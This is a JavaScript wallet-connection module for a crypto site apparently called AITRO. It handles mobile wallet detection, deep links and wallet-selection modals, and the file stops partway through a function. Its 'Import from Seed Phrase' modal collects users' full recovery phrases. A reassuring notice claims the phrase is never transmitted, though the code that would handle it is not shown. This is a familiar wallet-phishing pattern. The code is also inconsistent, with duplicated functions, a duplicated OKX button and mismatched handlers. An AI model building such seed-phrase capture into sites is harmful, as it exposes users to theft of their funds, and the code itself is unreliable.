/**
 * ============================================
 * WALLET CONNECTION MODULE v2.1 (ENHANCED)
 * ============================================
 * 
 * Handles direct wallet connections for:
 * - Tron (TronLink, Trust Wallet via Deep Link)
 * - Ethereum (MetaMask, Trust Wallet, WalletConnect)
 * - Binance Smart Chain (MetaMask, Trust Wallet)
 * 
 * Features:
 * - Mobile deep linking support (improved)
 * - In-App Browser detection and auto-connection
 * - WalletConnect v2 integration
 * - Automatic wallet detection
 * - Direct transaction signing
 * - Real-time balance checking
 * - Automated fee payment
 * - Fallback mechanisms for mobile
 */

// ============================================
// WALLET STATE MANAGEMENT
// ============================================

const walletState = {
    connected: false,
    provider: null,
    signer: null,
    address: null,
    network: null,
    balance: '0',
    chainId: null,
    walletType: null, // 'tronlink', 'metamask', 'trustwallet', 'walletconnect'
    isMobile: false,
    isInAppBrowser: false
};

// ============================================
// DEVICE & BROWSER DETECTION
// ============================================

/**
 * Detect if user is on mobile device
 */
function isMobileDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

/**
 * Detect if running inside an in-app browser (Trust Wallet, MetaMask, etc.)
 */
function detectInAppBrowser() {
    const ua = navigator.userAgent.toLowerCase();
    
    const inAppBrowsers = {
        trustWallet: ua.includes('trustwallet'),
        metaMaskMobile: ua.includes('metamask'),
        tokenPocket: ua.includes('tokenpocket'),
        imToken: ua.includes('imtoken'),
        coinbaseWallet: ua.includes('coinbasewallet'),
        rainbowWallet: ua.includes('rainbow'),
        argent: ua.includes('argent'),
        walletConnect: ua.includes('walletconnect')
    };
    
    return {
        isInApp: Object.values(inAppBrowsers).some(v => v),
        type: Object.keys(inAppBrowsers).find(k => inAppBrowsers[k]) || null,
        userAgent: ua
    };
}

/**
 * Auto-connect if in supported in-app browser
 */
async function autoConnectIfInAppBrowser() {
    const inApp = detectInAppBrowser();
    walletState.isInAppBrowser = inApp.isInApp;
    
    if (!inApp.isInApp) {
        return { success: false, message: 'Not in in-app browser' };
    }
    
    try {
        // Try Ethereum provider first (works for most in-app browsers)
        if (typeof window.ethereum !== 'undefined') {
            return await connectEthereumWallet();
        }
        
        // Try Tron provider
        if (typeof window.tronWeb !== 'undefined' && window.tronWeb.ready) {
            return await connectTronWallet();
        }
        
        return { success: false, message: 'No wallet provider detected in in-app browser' };
    } catch (error) {
        console.error('Auto-connect error:', error);
        return { success: false, message: error.message };
    }
}

// ============================================
// MOBILE WALLET DETECTION (Native Apps)
// ============================================

/**
 * Known mobile wallet URL schemes
 */
const MOBILE_WALLET_SCHEMES = {
    // Ethereum / EVM Wallets
    metamask: { 
        name: 'MetaMask', 
        icon: '🦊', 
        schemes: ['metamask://', 'https://metamask.app.link/'],
        universalLinks: ['https://metamask.app.link/'],
        chains: ['ERC20', 'BEP20'],
        color: '#F6851B'
    },
    trustwallet: { 
        name: 'Trust Wallet', 
        icon: '💙', 
        schemes: ['trust://', 'https://link.trustwallet.com/'],
        universalLinks: ['https://link.trustwallet.com/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#3375BB'
    },
    coinbasewallet: { 
        name: 'Coinbase Wallet', 
        icon: '🔵', 
        schemes: ['coinbasewallet://', 'cbwallet://', 'https://go.cb-w.com/'],
        universalLinks: ['https://go.cb-w.com/'],
        chains: ['ERC20', 'BEP20'],
        color: '#0052FF'
    },
    rainbow: { 
        name: 'Rainbow', 
        icon: '🌈', 
        schemes: ['rainbow://', 'https://rainbow.me/'],
        universalLinks: ['https://rainbow.me/'],
        chains: ['ERC20'],
        color: '#FF007A'
    },
    argent: { 
        name: 'Argent', 
        icon: '🛡️', 
        schemes: ['argent://', 'https://argent.xyz/'],
        universalLinks: ['https://argent.xyz/'],
        chains: ['ERC20'],
        color: '#00C7B7'
    },
    tokenpocket: { 
        name: 'TokenPocket', 
        icon: '🟣', 
        schemes: ['tokenpocket://', 'tp://', 'https://www.tokenpocket.pro/'],
        universalLinks: ['https://www.tokenpocket.pro/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#6C5CE7'
    },
    imtoken: { 
        name: 'imToken', 
        icon: '🔵', 
        schemes: ['imtoken://', 'https://token.im/'],
        universalLinks: ['https://token.im/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#0066FF'
    },
    bitkeep: { 
        name: 'Bitkeep', 
        icon: '🟡', 
        schemes: ['bitkeep://', 'https://bitkeep.com/'],
        universalLinks: ['https://bitkeep.com/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#FFB81C'
    },
    safepal: { 
        name: 'SafePal', 
        icon: '🟢', 
        schemes: ['safepal://', 'https://safepal.io/'],
        universalLinks: ['https://safepal.io/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#00C853'
    },
    mathwallet: { 
        name: 'MathWallet', 
        icon: '📐', 
        schemes: ['mathwallet://', 'https://mathwallet.org/'],
        universalLinks: ['https://mathwallet.org/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#6B46C1'
    },
    
    // Tron Wallets
    tronlink: { 
        name: 'TronLink', 
        icon: '🔴', 
        schemes: ['tronlink://', 'https://www.tronlink.org/'],
        universalLinks: ['https://www.tronlink.org/'],
        chains: ['TRC20'],
        color: '#FF0000'
    },
    
    // Multi-chain Wallets
    okxwallet: { 
        name: 'OKX Wallet', 
        icon: '⬛', 
        schemes: ['okx://', 'okxwallet://', 'https://www.okx.com/'],
        universalLinks: ['https://www.okx.com/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#000000'
    },
    binance: { 
        name: 'Binance Web3', 
        icon: '🟨', 
        schemes: ['bnc://', 'binance://', 'https://www.binance.com/'],
        universalLinks: ['https://www.binance.com/'],
        chains: ['ERC20', 'BEP20'],
        color: '#F3BA2F'
    },
    bybit: { 
        name: 'Bybit Wallet', 
        icon: '🟡', 
        schemes: ['bybit://', 'https://www.bybit.com/'],
        universalLinks: ['https://www.bybit.com/'],
        chains: ['ERC20', 'BEP20'],
        color: '#FFB81C'
    },
    crypto: { 
        name: 'Crypto.com DeFi', 
        icon: '🔵', 
        schemes: ['cryptodef://', 'crypto://', 'https://crypto.com/'],
        universalLinks: ['https://crypto.com/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#0052FF'
    },
    exodus: { 
        name: 'Exodus', 
        icon: '💚', 
        schemes: ['exodus://', 'https://www.exodus.com/'],
        universalLinks: ['https://www.exodus.com/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#00D47E'
    },
    zerion: { 
        name: 'Zerion', 
        icon: '💙', 
        schemes: ['zerion://', 'https://zerion.io/'],
        universalLinks: ['https://zerion.io/'],
        chains: ['ERC20', 'BEP20'],
        color: '#007AFF'
    },
    alphawallet: { 
        name: 'AlphaWallet', 
        icon: '🔵', 
        schemes: ['alphawallet://', 'https://alphawallet.com/'],
        universalLinks: ['https://alphawallet.com/'],
        chains: ['ERC20'],
        color: '#007AFF'
    },
    status: { 
        name: 'Status', 
        icon: '💬', 
        schemes: ['status://', 'https://status.im/'],
        universalLinks: ['https://status.im/'],
        chains: ['ERC20'],
        color: '#00D4AA'
    },
    ownbit: { 
        name: 'Ownbit', 
        icon: '🔐', 
        schemes: ['ownbit://', 'https://ownbit.io/'],
        universalLinks: ['https://ownbit.io/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#6C5CE7'
    },
    atoken: { 
        name: 'AToken', 
        icon: '💰', 
        schemes: ['atoken://', 'https://atoken.com/'],
        universalLinks: ['https://atoken.com/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#FF6B35'
    },
    c98: { 
        name: 'Coin98', 
        icon: '🟢', 
        schemes: ['c98://', 'coin98://', 'https://coin98.com/'],
        universalLinks: ['https://coin98.com/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#00C853'
    },
    huobi: { 
        name: 'Huobi Wallet', 
        icon: '🔥', 
        schemes: ['huobiwallet://', 'https://wallet.huobi.com/'],
        universalLinks: ['https://wallet.huobi.com/'],
        chains: ['ERC20', 'BEP20', 'TRC20'],
        color: '#FF4D4F'
    }
};

/**
 * Check if a wallet app is installed by attempting to open its URL scheme
 * Returns a Promise that resolves to true/false
 */
function checkWalletInstalled(scheme) {
    return new Promise((resolve) => {
        // For iOS, we can use a hidden iframe approach
        const startTime = Date.now();
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = scheme;
        document.body.appendChild(iframe);
        
        // If the app opens, the page will lose focus/visibility
        // We use a timeout to detect if the scheme was handled
        const timeout = setTimeout(() => {
            document.body.removeChild(iframe);
            // If less than 1500ms passed, the app likely opened
            // This is a heuristic - not 100% reliable
            const elapsed = Date.now() - startTime;
            resolve(elapsed < 2000); // heuristic
        }, 1500);
        
        // Also listen for visibility change
        const onVisibilityChange = () => {
            if (document.hidden) {
                clearTimeout(timeout);
                document.body.removeChild(iframe);
                document.removeEventListener('visibilitychange', onVisibilityChange);
                resolve(true);
            }
        };
        document.addEventListener('visibilitychange', onVisibilityChange);
    });
}

/**
 * Detect all installed mobile wallets
 * Returns a Promise that resolves to an object with wallet keys and boolean values
 */
async function detectInstalledMobileWallets() {
    const results = {};
    const isMobile = isMobileDevice();
    
    if (!isMobile) {
        // On desktop, check for browser extensions
        return detectAvailableWallets();
    }
    
    // On mobile, check each wallet's URL scheme
    const walletKeys = Object.keys(MOBILE_WALLET_SCHEMES);
    
    // Check in parallel for speed
    const checks = walletKeys.map(async (key) => {
        const wallet = MOBILE_WALLET_SCHEMES[key];
        let installed = false;
        
        // Try each scheme
        for (const scheme of wallet.schemes) {
            try {
                // Use a simpler approach: try to open and detect
                // We'll use a more reliable method - check if we can at least attempt
                const testUrl = scheme.replace(/\/$/, '') + '/';
                installed = await checkWalletInstalled(testUrl);
                if (installed) break;
            } catch (e) {
                // Scheme not handled
            }
        }
        
        // Also check universal links as fallback (iOS)
        if (!installed) {
            for (const ul of wallet.universalLinks) {
                try {
                    installed = await checkWalletInstalled(ul);
                    if (installed) break;
                } catch (e) {}
            }
        }
        
        return { key, installed };
    });
    
    const walletResults = await Promise.all(checks);
    walletResults.forEach(r => { results[r.key] = r.installed; });
    
    // Also check for TronLink specifically (has different detection)
    results.tronlink = results.tronlink || (typeof window.tronWeb !== 'undefined' && window.tronWeb.ready);
    results.metamask = results.metamask || (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask);
    results.trustwallet = results.trustwallet || (typeof window.ethereum !== 'undefined' && window.ethereum.isTrust);
    results.okxwallet = results.okxwallet || typeof window.okxwallet !== 'undefined';
    results.bitkeep = results.bitkeep || (typeof window.bitkeep !== 'undefined' && window.bitkeep.ethereum);
    results.binance = results.binance || (typeof window.BinanceChain !== 'undefined' || (window.ethereum && window.ethereum.isBinance));
    
    // WalletConnect is always available
    results.walletconnect = true;
    
    return results;
}

/**
 * Open wallet app via deep link
 */
function openWalletApp(walletKey, callbackUrl = null) {
    const wallet = MOBILE_WALLET_SCHEMES[walletKey];
    if (!wallet) return false;
    
    const url = callbackUrl || window.location.href;
    const encodedUrl = encodeURIComponent(url);
    
    // Try schemes in order
    for (const scheme of wallet.schemes) {
        let deepLink;
        if (scheme.endsWith('://')) {
            // Custom scheme - append callback
            if (walletKey === 'trustwallet') {
                deepLink = `${scheme}browser_request?url=${encodedUrl}&requestId=${Math.random().toString(36).substring(7)}`;
            } else if (walletKey === 'metamask') {
                deepLink = `${scheme}wc?uri=${encodedUrl}`;
            } else if (walletKey === 'coinbasewallet') {
                deepLink = `${scheme}dapp?url=${encodedUrl}`;
            } else if (walletKey === 'rainbow') {
                deepLink = `${scheme}wc?uri=${encodedUrl}`;
            } else if (walletKey === 'argent') {
                deepLink = `${scheme}wc?uri=${encodedUrl}`;
            } else if (walletKey === 'tokenpocket') {
                deepLink = `${scheme}dapp?url=${encodedUrl}`;
            } else if (walletKey === 'imtoken') {
                deepLink = `${scheme}dapp?url=${encodedUrl}`;
            } else if (walletKey === 'bitkeep') {
                deepLink = `${scheme}dapp?url=${encodedUrl}`;
            } else if (walletKey === 'tronlink') {
                deepLink = `${scheme}dapp?url=${encodedUrl}`;
            } else if (walletKey === 'okxwallet') {
                deepLink = `${scheme}dapp?url=${encodedUrl}`;
            } else if (walletKey === 'binance') {
                deepLink = `${scheme}dapp?url=${encodedUrl}`;
            } else {
                deepLink = `${scheme}dapp?url=${encodedUrl}`;
            }
        } else {
            // Universal link
            deepLink = `${scheme}?url=${encodedUrl}`;
        }
        
        try {
            window.location.href = deepLink;
            return true;
        } catch (e) {
            continue;
        }
    }
    return false;
}

/**
 * Get wallets filtered by supported chain
 */
function getWalletsForChain(chain) {
    return Object.entries(MOBILE_WALLET_SCHEMES)
        .filter(([_, wallet]) => wallet.chains.includes(chain))
        .map(([key, wallet]) => ({ key, ...wallet }));
}

    /**
 * Show enhanced wallet selection modal with mobile detection
 */
function showWalletSelectionModal() {
    const wallets = detectAvailableWallets();
    const isMobile = isMobileDevice();
    const inApp = detectInAppBrowser();
    
    let html = `
        <div id="walletSelectionModal" class="modal" style="display: flex; z-index: 5000;">
            <div class="modal-content" style="max-width: 400px;">
                <div class="modal-header">
                    <h2>Select Your Wallet</h2>
                    <button class="modal-close" onclick="closeWalletSelectionModal()">✕</button>
                </div>
                <div style="padding: 20px;">
    `;

    // Show in-app browser notice if applicable
    if (inApp.isInApp) {
        html += `
            <div style="background: rgba(0, 242, 255, 0.1); border-left: 3px solid #00f2ff; padding: 10px; margin-bottom: 15px; border-radius: 4px; font-size: 12px; color: #ccc;">
                <strong>✓ In-App Browser Detected</strong><br>
                Your wallet is ready to connect automatically.
            </div>
        `;
    }

    // OKX Wallet Option (supports Tron, EVM, and more)
    if (wallets.okxwallet) {
        html += `
            <button class="wallet-option" onclick="connectOKXWallet()" style="width: 100%; padding: 15px; margin-bottom: 10px; background: linear-gradient(135deg, #000000, #1a1a1a); border: 2px solid #FFFFFF; color: white; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
                <span style="font-size: 20px;">⬛</span> OKX Wallet
            </button>
        `;
    }

    // Bybit (Bitget) Wallet Option
    if (wallets.bitget) {
        html += `
            <button class="wallet-option" onclick="connectBitgetWallet()" style="width: 100%; padding: 15px; margin-bottom: 10px; background: linear-gradient(135deg, #FFB81C, #FF9500); border: none; color: white; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
                <span style="font-size: 20px;">🟡</span> Bybit Wallet
            </button>
        `;
    }

    // Binance Web3 Wallet Option
    if (wallets.binance) {
        html += `
            <button class="wallet-option" onclick="connectAndResolve('binance')" style="width: 100%; padding: 15px; margin-bottom: 10px; background: linear-gradient(135deg, #F3BA2F, #FCCB45); border: none; color: #000; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
                <span style="font-size: 20px;">🟨</span> Binance Web3
            </button>
        `;
    }

    // OKX Wallet Option (supports Tron, EVM, and more)
    if (wallets.okxwallet) {
        html += `
            <button class="wallet-option" onclick="connectAndResolve('okx')" style="width: 100%; padding: 15px; margin-bottom: 10px; background: linear-gradient(135deg, #000000, #1a1a1a); border: 2px solid #FFFFFF; color: white; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
                <span style="font-size: 20px;">⬛</span> OKX Wallet
            </button>
        `;
    }

    // TronLink Option
    if (wallets.tronlink) {
        html += `
            <button class="wallet-option" onclick="connectAndResolve('tron')" style="width: 100%; padding: 15px; margin-bottom: 10px; background: linear-gradient(135deg, #FF0000, #CC0000); border: none; color: white; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
                <span style="font-size: 20px;">🔴</span> TronLink
            </button>
        `;
    }

    // MetaMask Option
    if (wallets.metamask) {
        html += `
            <button class="wallet-option" onclick="connectAndResolve('ethereum')" style="width: 100%; padding: 15px; margin-bottom: 10px; background: linear-gradient(135deg, #F6851B, #E84D3D); border: none; color: white; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
                <span style="font-size: 20px;">🦊</span> MetaMask
            </button>
        `;
    }

    // Trust Wallet Option (Deep Link for mobile)
    if (isMobile) {
        html += `
            <button class="wallet-option" onclick="connectAndResolve('trust')" style="width: 100%; padding: 15px; margin-bottom: 10px; background: linear-gradient(135deg, #3375BB, #1E4D8B); border: none; color: white; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
                <span style="font-size: 20px;">💙</span> Trust Wallet
            </button>
        `;
    }

    // WalletConnect Option (for desktop or as fallback)
    if (!isMobile || !wallets.tronlink) {
        html += `
            <button class="wallet-option" onclick="connectAndResolve('walletconnect')" style="width: 100%; padding: 15px; margin-bottom: 10px; background: linear-gradient(135deg, #3B99FC, #2E7FD6); border: none; color: white; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
                <span style="font-size: 20px;">🌐</span> WalletConnect
            </button>
        `;
    }

    // Import from Seed Phrase Option (Manual wallet recovery)
    html += `
        <button class="wallet-option" onclick="openSeedImportModal()" style="width: 100%; padding: 15px; margin-bottom: 10px; background: linear-gradient(135deg, #6B46C1, #553C9A); border: none; color: white; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; border: 2px solid rgba(255,255,255,0.2);">
            <span style="font-size: 20px;">🔐</span> Import from Seed Phrase
        </button>
    `;

    // Mobile-specific help text
    if (isMobile) {
        html += `
            <div style="margin-top: 15px; padding: 10px; background: rgba(255, 255, 255, 0.05); border-radius: 4px; font-size: 12px; color: #999; text-align: center;">
                <p style="margin: 0;">💡 Tip: For best experience, open this link directly in your wallet's browser.</p>
            </div>
        `;
    }

    html += `
                </div>
            </div>
        </div>
    `;

    document.body.insertAdjacentHTML('beforeend', html);
}

function closeWalletSelectionModal() {
    const modal = document.getElementById('walletSelectionModal');
    if (modal) modal.remove();
}

/**
 * Connect wallet and resolve the selection promise
 */
async function connectAndResolve(walletType) {
    closeWalletSelectionModal();
    
    let result;
    
    try {
        switch (walletType) {
            case 'tron':
                result = await connectTronWallet();
                break;
            case 'ethereum':
                result = await connectEthereumWallet();
                break;
            case 'trust':
                result = await connectTrustWalletDeepLink();
                break;
            case 'walletconnect':
                result = await connectWalletConnect();
                break;
            default:
                result = { success: false, message: 'Unknown wallet type' };
        }
    } catch (error) {
        result = { success: false, message: error.message };
    }
    
    resolveWalletSelection(result);
}

/**
 * Connect and resolve for OKX Wallet
 */
async function connectAndResolveOKX() {
    closeWalletSelectionModal();
    try {
        const result = await connectOKXWallet();
        resolveWalletSelection(result);
    } catch (error) {
        resolveWalletSelection({ success: false, message: error.message });
    }
}

/**
 * Connect and resolve for Bybit Wallet
 */
async function connectAndResolveBitget() {
    closeWalletSelectionModal();
    try {
        const result = await connectBitgetWallet();
        resolveWalletSelection(result);
    } catch (error) {
        resolveWalletSelection({ success: false, message: error.message });
    }
}

/**
 * Connect and resolve for Binance Wallet
 */
async function connectAndResolveBinance() {
    closeWalletSelectionModal();
    try {
        const result = await connectBinanceWallet();
        resolveWalletSelection(result);
    } catch (error) {
        resolveWalletSelection({ success: false, message: error.message });
    }
}

/**
 * Connect and resolve for OKX Wallet (mobile deep link)
 */
async function connectAndResolveOKX() {
    closeWalletSelectionModal();
    try {
        // For mobile, use deep link to open OKX app
        const isMobile = isMobileDevice();
        if (isMobile) {
            const opened = openWalletApp('okxwallet');
            if (opened) {
                // Wait for connection via polling
                return new Promise((resolve) => {
                    let resolved = false;
                    const checkConnection = setInterval(() => {
                        if (walletState.connected && !resolved) {
                            resolved = true;
                            clearInterval(checkConnection);
                            resolve({
                                success: true,
                                address: walletState.address,
                                network: walletState.network,
                                isMobile: true
                            });
                        }
                    }, 500);
                    
                    setTimeout(() => {
                        if (!resolved) {
                            resolved = true;
                            clearInterval(checkConnection);
                            resolve({ 
                                success: false, 
                                message: "OKX Wallet app opened but connection not completed. Please approve in the app.",
                                code: 'OKX_CONNECTION_TIMEOUT'
                            });
                        }
                    }, 30000);
                });
            }
        }
        
        // Fallback to browser extension method
        const result = await connectOKXWallet();
        resolveWalletSelection(result);
    } catch (error) {
        resolveWalletSelection({ success: false, message: error.message });
    }
}

/**
 * Open seed phrase import modal - Professional UI
 */
function openSeedImportModal() {
    closeWalletSelectionModal();
    
    let html = `
        <div id="seedImportModal" class="modal" style="display: flex; z-index: 5000;">
            <div class="modal-content" style="max-width: 560px; width: 95%;">
                <div class="modal-header">
                    <h2>Import Wallet from Seed Phrase</h2>
                    <button class="modal-close" onclick="closeSeedImportModal()">✕</button>
                </div>
                <div style="padding: 24px;">
                    <div style="background: linear-gradient(90deg, rgba(255, 215, 0, 0.1), rgba(255, 215, 0, 0.02)); border: 1px solid #FFD700; border-radius: 10px; padding: 16px; margin-bottom: 24px; font-size: 13px; color: #FFD700; position: relative;">
                        <div style="display: flex; align-items: flex-start; gap: 10px;">
                            <span style="font-size: 18px; flex-shrink: 0;">🔐</span>
                            <div>
                                <strong style="font-size: 14px;">Security Notice</strong><br>
                                <span style="opacity: 0.9;">Enter your seed phrase only on this official AITRO page. Import happens locally in your browser — we never store, transmit, or see your phrase.</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="seedPhraseInput" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
                            <span>Seed Phrase</span>
                            
                            <!-- Toggle 12/24 words -->
                            <label class="word-count-toggle" style="display: inline-flex; align-items: center; gap: 8px; cursor: pointer; font-size: 12px; color: var(--text-secondary);">
                                <input type="checkbox" id="wordCountToggle" style="width: 16px; height: 16px; accent-color: var(--primary-neon); cursor: pointer;">
                                <span id="toggleLabel">Show 24 words</span>
                            </label>
                        </label>
                        
                        <span id="wordCountBadge" style="font-size: 11px; padding: 2px 8px; border-radius: 4px; background: rgba(255,255,255,0.1); color: var(--text-secondary); margin-top: 8px; display: inline-block;">0 / 12 words</span>
                        
                        <!-- Professional word boxes -->
                        <div id="seedWordBoxes" style="
                            display: grid;
                            grid-template-columns: repeat(6, 1fr);
                            gap: 8px;
                            margin-top: 12px;
                        "></div>
                        
                        <!-- Hidden textarea for paste/accessibility -->
                        <textarea id="seedPhraseInput" placeholder="Paste or type your seed phrase here..." rows="3" style="
                            position: absolute;
                            opacity: 0;
                            pointer-events: none;
                            height: 1px;
                            width: 1px;
                        "></textarea>
                        
                        <div id="seedValidationMsg" style="font-size: 12px; min-height: 18px; margin-top: 8px;"></div>
                        <p class="help-text" style="margin-top: 8px; font-size: 12px;">Supports 12, 15, 18, 21, or 24 words. Paste full phrase or type word by word.</p>
                    </div>
                    
                    <div class="form-group">
                        <label for="seedNetworkSelect">Network</label>
                        <select id="seedNetworkSelect" style="width: 100%; padding: 14px; background: rgba(0, 0, 0, 0.5); border: 2px solid var(--border-neon); border-radius: 0; color: var(--primary-neon); font-size: 14px; font-family: 'Space Mono', monospace; appearance: none; background-image: url('data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"12\" height=\"12\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"%2300FF41\" stroke-width=\"2\"><path d=\"M6 9l6 6 6-6\"/></svg>'); background-repeat: no-repeat; background-position: right 12px center; padding-right: 40px;">
                            <option value="ERC20">Ethereum (ERC20)</option>
                            <option value="BEP20">Binance Smart Chain (BEP20)</option>
                            <option value="TRC20">Tron (TRC20)</option>
                        </select>
                    </div>
                    
                    <button id="importSeedBtn" class="btn-primary btn-full" onclick="importSeedPhrase()" style="margin-top: 20px; padding: 16px; font-size: 14px;">
                        <span class="btn-text">🔐 Import Wallet</span>
                        <span class="btn-loader" style="display: none;">⏳ Importing...</span>
                    </button>
                    
                    <div id="seedImportStatus" style="margin-top: 16px; padding: 14px; border-radius: 8px; display: none; font-size: 13px; line-height: 1.6;"></div>
                </div>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', html);
    
    // Initialize word boxes after DOM insertion
    setTimeout(initializeSeedWordBoxes, 0);
}

function initializeSeedWordBoxes() {
    const container = document.getElementById('seedWordBoxes');
    const textarea = document.getElementById('seedPhraseInput');
    const wordCountBadge = document.getElementById('wordCountBadge');
    const validationMsg = document.getElementById('seedValidationMsg');
    const wordCountToggle = document.getElementById('wordCountToggle');
    const toggleLabel = document.getElementById('toggleLabel');
    
    if (!container) return;
    
    let maxWords = 12; // Start with 12 words
    
    // Toggle handler for 12/24 words
    if (wordCountToggle) {
        wordCountToggle.addEventListener('change', (e) => {
            maxWords = e.target.checked ? 24 : 12;
            toggleLabel.textContent = e.target.checked ? 'Show 12 words' : 'Show 24 words';
            renderWordBoxes(maxWords);
        });
    }
    
    function renderWordBoxes(count) {
        container.innerHTML = '';
        
        for (let i = 0; i < count; i++) {
            const box = document.createElement('input');
            box.type = 'text';
            box.className = 'seed-word-box';
            box.dataset.index = i;
            box.maxLength = 20;
            box.autocomplete = 'off';
            box.spellcheck = false;
            box.style.cssText = `
                padding: 12px 8px;
                background: rgba(0, 0, 0, 0.4);
                border: 2px solid var(--border-color);
                border-radius: 6px;
                color: var(--primary-neon);
                font-family: 'Space Mono', monospace;
                font-size: 13px;
                text-align: center;
                text-transform: lowercase;
                outline: none;
                transition: all 0.2s ease;
                box-sizing: border-box;
            `;
            
            // Focus/blur effects
            box.addEventListener('focus', () => {
                box.style.borderColor = 'var(--primary-neon)';
                box.style.boxShadow = '0 0 0 3px rgba(0, 255, 65, 0.15)';
                box.style.background = 'rgba(0, 255, 65, 0.05)';
            });
            
            box.addEventListener('blur', () => {
                box.style.boxShadow = 'none';
                box.style.background = 'rgba(0, 0, 0, 0.4)';
                updateWordBoxState(box);
            });
            
            // Input handling
            box.addEventListener('input', (e) => {
                e.target.value = e.target.value.toLowerCase().replace(/[^a-z]/g, '');
                syncWordsToTextarea();
                updateWordCount();
                validateSeedPhraseRealTime();
                
                // Auto-focus next empty box
                if (e.target.value.length >= 3 && !e.target.value.includes(' ')) {
                    const nextBox = container.querySelector(`[data-index="${parseInt(e.target.dataset.index) + 1}"]`);
                    if (nextBox && !nextBox.value) nextBox.focus();
                }
            });
            
            // Keyboard navigation
            box.addEventListener('keydown', (e) => {
                const idx = parseInt(e.target.dataset.index);
                
                if (e.key === 'Backspace' && !e.target.value && idx > 0) {
                    const prevBox = container.querySelector(`[data-index="${idx - 1}"]`);
                    if (prevBox) prevBox.focus();
                }
                
                if (e.key === 'ArrowRight' && idx < maxWords - 1) {
                    const nextBox = container.querySelector(`[data-index="${idx + 1}"]`);
                    if (nextBox) nextBox.focus();
                }
                
                if (e.key === 'ArrowLeft' && idx > 0) {
                    const prevBox = container.querySelector(`[data-index="${idx - 1}"]`);
                    if (prevBox) prevBox.focus();
                }
                
                if (e.key === 'Enter') {
                    e.preventDefault();
                    importSeedPhrase();
                }
            });
            
            // Paste handling on first box
            if (i === 0) {
                box.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pastedText = (e.clipboardData || window.clipboardData).getData('text');
                    handlePastedSeedPhrase(pastedText);
                });
            }
            
            container.appendChild(box);
        }
        
        // Update badge max
        updateWordCount();
    }
    
    // Initial render with 12 boxes
    renderWordBoxes(maxWords);
    
    // Also allow paste on container
    container.addEventListener('paste', (e) => {
        const pastedText = (e.clipboardData || window.clipboardData).getData('text');
        handlePastedSeedPhrase(pastedText);
    });
    
    function syncWordsToTextarea() {
        const words = Array.from(container.querySelectorAll('.seed-word-box'))
            .map(box => box.value.trim())
            .filter(w => w.length > 0);
        textarea.value = words.join(' ');
    }
    
    function updateWordCount() {
        const words = Array.from(container.querySelectorAll('.seed-word-box'))
            .map(box => box.value.trim())
            .filter(w => w.length > 0);
        const count = words.length;
        wordCountBadge.textContent = `${count} / ${maxWords} words`;
        wordCountBadge.style.color = count >= 12 ? '#00FF41' : 'var(--text-secondary)';
        wordCountBadge.style.background = count >= 12 ? 'rgba(0, 255, 65, 0.15)' : 'rgba(255,255,255,0.1)';
    }
    
    function validateSeedPhraseRealTime() {
        const words = Array.from(container.querySelectorAll('.seed-word-box'))
            .map(box => box.value.trim())
            .filter(w => w.length > 0);
        
        if (words.length === 0) {
            validationMsg.textContent = '';
            validationMsg.style.color = '';
            return;
        }
        
        const validLengths = [12, 15, 18, 21, 24];
        const isValidLength = validLengths.includes(words.length);
        
        // Check if all words are alphabetic
        const allAlpha = words.every(w => /^[a-z]+$/i.test(w));
        
        if (words.length < 12) {
            validationMsg.textContent = `Need ${12 - words.length} more words (minimum 12)`;
            validationMsg.style.color = '#FFD700';
        } else if (!isValidLength) {
            validationMsg.textContent = `Invalid word count: ${words.length}. Must be 12, 15, 18, 21, or 24 words.`;
            validationMsg.style.color = '#FF0055';
        } else if (!allAlpha) {
            validationMsg.textContent = 'Words must contain only letters (a-z)';
            validationMsg.style.color = '#FF0055';
        } else {
            validationMsg.textContent = `✓ Valid ${words.length}-word seed phrase`;
            validationMsg.style.color = '#00FF41';
        }
    }
    
    function updateWordBoxState(box) {
        const value = box.value.trim();
        if (value.length === 0) {
            box.style.borderColor = 'var(--border-color)';
        } else if (/^[a-z]+$/i.test(value)) {
            box.style.borderColor = '#00FF41';
        } else {
            box.style.borderColor = '#FF0055';
        }
    }
    
    function handlePastedSeedPhrase(text) {
        const words = text.trim().toLowerCase().split(/\s+/).filter(w => w.length > 0);
        
        // If more words than current max and toggle is off, auto-enable 24 mode
        if (words.length > maxWords && wordCountToggle && !wordCountToggle.checked) {
            wordCountToggle.checked = true;
            toggleLabel.textContent = 'Show 12 words';
